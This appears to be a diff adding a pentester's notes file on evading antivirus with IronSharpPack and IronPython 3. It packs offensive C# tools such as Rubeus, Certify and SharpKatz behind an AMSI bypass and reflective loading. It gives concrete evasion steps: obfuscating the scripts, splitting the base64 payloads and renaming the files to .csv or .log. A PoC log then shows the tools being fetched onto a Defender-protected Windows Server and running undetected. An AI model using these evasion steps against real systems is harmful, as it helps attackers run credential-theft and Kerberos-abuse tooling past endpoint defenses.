@@ -1,0 +1,227 @@
+=============================================================================================================================================
+AV bypass using the packer 'IronSharpPack' and IronPython 3
+=============================================================================================================================================
+
+IronSharpPack (https://github.com/BC-SECURITY/IronSharpPack)
+------------------------------------------------------------
+> It is a repository of popular C# offensive security projects (e.g., Rubeus, Certify, SharpUP, SharpKatz) that have been 
+  embedded into IronPython scripts that execute an AMSI bypass (DLL patching method) and then reflective load the C# projects. 
+> The C# assemblies used for this repos were pulled from Flangvik's Sharp Collection.
+> The project also includes 'IronEmbed.py', a script that automatically compresses and embeds .NET assemblies into the script wrapper.
+  Any .NET assembly can be used as long as it has a Main or MainString function. 
+  MainString must be a public function, but public or private Main functions are supported.
+
+
+IronPython 3 (https://github.com/IronLanguages/ironpython3)
+------------------------------------------------------------
+> IronPython is a (portable) open-source implementation of the Python programming language that is integrated with .Net.
+> It can use .NET and Python libraries, and other .NET languages can use Python code just as easily.
+> IronPython 3 targets Python 3, including the re-organized standard library, Unicode strings, and all of the other new features.
+
+Notes regarding AV detection
+-----------------------------
+To avoid most AV product detection it is important to do the following actions:
+
+1. Modify a little the code before compiling yourself the C# offensive tools that you want to pack with IronEmbed.py (IronSharpPack)
+   => so the base 64 encoded string of your tools will less likely be detected by static AV scan when embeded in the python scripts
+
+2. Modify the python scripts that you generated with IronEmbed.py (IronSharpPack) and which embed your C# tools: 
+  + delete or modify all the comments
+  + rename the name of all the functions and variables
+  + split in 2 the base 64 encoded string of your tools (i.e., base64_str = string_1 + string_2)
+
+3. Rename the extension of the iron python scripts (embeding your C# tools) by ".txt" or ".csv" or ".log" instead of ".py"
+
+
+=============================================================================================================================================
+Test/PoC - Execute on a Windows server 2022 several C# offensive security tools (Rubeus+Certify) embeded in python scripts 
+           without being detected by the Microsoft Defender Antivirus  
+=============================================================================================================================================
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+Step 1 - Generate python scripts that embed C# offensive security projects (exe and dll files) with the script IronEmbed.py 
+         from the IronSharpPack project 
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\> dir C:\Temp\assemblies-to-pack
+<SNIP>
+05/09/2025  12:33 AM           178,176 Certify.exe
+05/09/2025  12:33 AM            29,696 PassTheCert.exe
+03/19/2023  09:24 PM           493,056 Rubeus-v2.exe
+02/19/2023  05:20 AM           284,672 SharpKatz.exe
+12/23/2022  03:32 AM            38,912 SharpUp.exe
+               6 File(s)      1,325,568 bytes
+               2 Dir(s)  200,416,964,608 bytes free
+
+C:\Temp\Tools-Pentest\23-Python\IronPython3\net462> ipy.exe .\IronEmbed.py C:\Temp\assemblies-to-pack
+
+C:\Temp\Tools-Pentest\23-Python\IronPython3\net462> dir
+ Volume in drive C is Windows
+ Volume Serial Number is F06E-DC58
+
+ Directory of C:\Temp\Tools-Pentest\23-Python\IronPython3\net462
+
+05/24/2025  10:05 PM    <DIR>          .
+05/24/2025  10:05 PM    <DIR>          ..
+05/22/2025  05:58 PM    <DIR>          DLLs
+<SNIP>
+12/19/2024  09:49 PM            24,064 ipy.exe
+04/16/2024  03:24 PM             3,831 IronSharpPack_template.py
+04/16/2024  03:24 PM             1,333 IronEmbed.py
+<SNIP>
+05/24/2025  10:05 PM           134,192 IronCertify-v1.1.py
+05/24/2025  10:05 PM           245,134 IronRubeus-v2.2.2.py
+05/24/2025  10:05 PM           160,750 IronSharpKatz.py
+05/24/2025  10:05 PM            26,204 IronSharpUp.py
+
+
+> Then do the following actions to be able to bypass most antivirus software:
+
+    1. Modify the python scripts that you generated with IronEmbed.py (IronSharpPack) and which embed your C# tools: 
+       + delete or modify all the comments
+       + rename the name of all the functions and variables
+       + split in 2 the base 64 encoded string of your tools (i.e., base64_str = string_1 + string_2)
+
+    2. Rename the extension of the iron python scripts (embeding your C# tools) by ".txt" or ".csv" or ".log" instead of ".py"
+     + For intance:
+       > "IronRubeus-v2.2.2.py" is renamed as "tool1.csv"
+       > "IronCertify-v1.1.py" is renamed as "IronCert.log"
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Upload IronPython 3 and the malicious scripts on a Windows server 2022 protected by the MS Defender Antivirus
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\Administrator> systeminfo
+
+Host Name:                 SERVER-WIN2022
+OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
+OS Version:                10.0.20348 N/A Build 20348
+OS Manufacturer:           Microsoft Corporation
+<SNIP>
+
+PS C:\Users\Administrator>  Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled|FL
+
+AntivirusEnabled          : True
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+PS C:\Users\Administrator> wget -URI http://192.168.1.144:8080/IronPythonPortable.zip -OutFile IronPythonPortable.zip
+
+PS C:\Users\Administrator> tar -xf .\IronPythonPortable.zip
+
+PS C:\Users\Administrator> cd .\IronPython\
+
+PS C:\Users\Administrator\IronPython> dir
+
+    Directory: C:\Users\Administrator\IronPython
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         5/24/2025  10:27 PM                lib
+d-----         5/24/2025   2:15 PM                net462
+
+PS C:\Users\Administrator\IronPython> cd .\net462\
+
+PS C:\Users\Administrator\IronPython\net462> ls .\tool1.csv
+
+    Directory: C:\Users\Administrator\IronPython\net462
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/24/2025   2:16 PM         226366 tool1.csv
+
+
+PS C:\Users\Administrator\IronPython\net462> ls .\IronCert.log
+
+    Directory: C:\Users\Administrator\IronPython\net462
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/24/2025   2:17 PM         133518 IronCert.log
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Execute with IronPython 3 the malicious python scripts generated in step 1 to execute Rubeus and Certify without 
+         being detected and blocked by the Microsoft Defender Antivirus (AMSI bypass + reflective memory loading)
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\Administrator\IronPython\net462> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled | FL
+
+AntivirusEnabled          : True
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+PS C:\Users\Administrator\IronPython\net462> .\ipy.exe .\tool1.csv
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.2
+
+ Ticket requests and renewals:
+
+    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] [/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]
+
+<SNIP>
+
+PS C:\Users\Administrator\IronPython\net462> .\ipy.exe .\tool1.csv currentluid
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.2
+
+[*] Action: Display current LUID
+
+[*] Current LogonID (LUID) : 0xae44d (713805)
+
+
+PS C:\Users\Administrator\IronPython\net462> 
+
+PS C:\Users\Administrator\IronPython\net462> .\ipy.exe .\IronCertify.log
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+  Find information about all registered CAs:
+
+    Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks] [/quiet]
+
+
+  Find all enabled certificate templates:
+
+    Certify.exe find [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+
+  Find vulnerable/abusable certificate templates using default low-privileged groups:
+
+    Certify.exe find /vulnerable [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+
+  Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
+
+    Certify.exe find /vulnerable /currentuser [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+
+  Find enabled certificate templates where ENROLLEE_SUPPLIES_SUBJECT is enabled:
+
+    Certify.exe find /enrolleeSuppliesSubject [/ca:SERVER\ca-name| /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
+
+<SNIP>
